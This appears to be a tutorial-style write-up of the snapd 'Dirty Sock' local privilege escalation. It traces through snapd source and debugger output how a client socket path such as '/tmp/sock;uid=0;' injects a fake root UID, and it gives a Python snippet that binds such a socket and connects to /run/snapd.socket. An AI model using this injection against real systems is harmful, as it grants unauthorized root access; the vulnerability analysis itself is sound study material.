Privilege Escalation with Dirty Socket

describes a local privilege escalation vulnerability in snapd, where a normal user can trick the system into thinking they are root by exploiting a bug in how snapd parses socket data.

href

Prereuisite

1. What is snap?

Snap is a packaging system developed by Canonical. It's self-contained system(no need to think about compatibility), secure(since it's isolated), and cross-distro compatible.

Think of Snap like a Docker for apps, but specifically for Linux desktop/server applications.

2. What is snapd?

snapd is a system service that manages Snap packages.

It listens on a UNIX domain socket for API requests, typically at /run/snapd.socket.

3. snapd behavior

When you try to call sensitive Snap API functions like installing a Snap or managing system services, snapd checks your UID, and if ur not root user, it blocks you from privilege action.

4. What is socket?

A socket is an endpoint for sending and receiving data between two programs. It can be both remote/local.

NOTE : snapd uses a UNIX domain socket for REST API communication, which is local-only between applications. Instead of a TCP port, it uses a file path (e.g., /run/snapd.socket) as the communication endpoint.

5. REST API

REST API stands for : Representational State Transfer Application Programming Interface.

It's a standard way for two systems to communicate over HTTP.

A web-browser talking to a server -> A mobile app sending data to a backend -> A script talking to a local service.

6. REST API and UNIX domain socket

UNIX domain socket : communication channel(local only). It contains user UID, and we exploit this file in this context.
REST API : communication protocol (how the data is structured and interpreted).

7. AF_UNIX

Local inter-process communication (IPC).

Communication between programs on the same machine.

Vulnerability

$ ls -aslh /run/snapd*
0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd-snap.socket
0 srw-rw-rw- 1 root root  0 Jan 25 03:42 /run/snapd.socket

As stated above, Snap has various functionalities, but snapd checks whether the user is privileged when accessing system-related functions. However, when a connection is made to a UNIX domain socket, the kernel attaches UID, GID, and PID as peer credentials. If an attacker can **trick snapd into misreading these credential*, they may gain unauthorized access to privileged functions.

In addition, there is a function "POST /v2/create-user", which create a local user. This function requires privilege, but we may fake it.

To accomplish this step, we need to know how snap takes ID information.

Then, take a look at this line :

ucred, err := getUcred(int(f.Fd()), sys.SOL_SOCKET, sys.SO_PEERCRED)

This function checks PID, UID, and socket information.

The AF_UNIX is file path, but works as same as usual ports. Therefore, we can access to the path with "nc" command.

$ nc -U /run/snapd.socket

Internal movement

1. Snapd is already running, listening on /run/snapd.socket.

2. When your nc command connects to that socket, snapd accepts the incoming connection and runs getUcred().

Then, we can set a breakpoint at the line where getUcred() is called with debugger, and see what happened.

(dlv) print ucred
*syscall.Ucred {Pid: 5388, Uid: 1000, Gid: 1000}

But this function doesn't end here. The outputs of this function is modified in other function.

Here, connection info is added to a new object along with the values discovered above.

func (wc *ucrednetConn) RemoteAddr() net.Addr {
	return &ucrednetAddr{wc.Conn.RemoteAddr(), wc.pid, wc.uid, wc.socket}
}

On the line "return...", the attacker crafts a malicious socket path that injects fake UID=0, and Snapd uses that fake UID instead of the real one.

Next, values extracted before are concatenated into a single string.

func (wa *ucrednetAddr) String() string {
	return fmt.Sprintf("pid=%s;uid=%s;socket=%s;%s", wa.pid, wa.uid, wa.socket, wa.Addr)
}

At the end, these values are reconstructed and made into individuals.

func ucrednetGet(remoteAddr string) (pid uint32, uid uint32, socket string, err error) {
...
	for _, token := range strings.Split(remoteAddr, ";") {
		var v uint64
...
		} else if strings.HasPrefix(token, "uid=") {
			if v, err = strconv.ParseUint(token[4:], 10, 32); err == nil {
				uid = uint32(v)
			} else {
				break
}

Take those into consideration, check the debugger.

(dlv) print remoteAddr
"pid=5127;uid=1000;socket=/run/snapd.socket;@"

There is unknown variable "socket;@". Same as before, use debug mode and delve into where it comes from.

(dlv) print c.fd
...
	laddr: net.Addr(*net.UnixAddr) *{
		Name: "/run/snapd.socket",
		Net: "unix",},
	raddr: net.Addr(*net.UnixAddr) *{Name: "@", Net: "unix"},}

Since the function is named 'UnixAddr', we can infer this dictionary include internet address. Also, according to the unix man page, @ is "abstract namespace", which is used to bind sockets independent of the filesystem.

Why it uses abstract namespace?

If you connect to the server using nc -U (Unix socket mode), there is no raddr(remote address) to quote.

Therefore, if we can create our own socket which is totally under control.

Using python, we can accomplish that. This is the snippet of the python.

## Setting a socket name with the payload included
sockfile = "/tmp/sock;uid=0;"

## Bind the socket
client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
client_sock.bind(sockfile)

## Connect to the snap daemon
client_sock.connect('/run/snapd.socket')

Here, we could falsify uid.

(dlv) print remoteAddr
"pid=5275;uid=1000;socket=/run/snapd.socket;/tmp/sock;uid=0;"
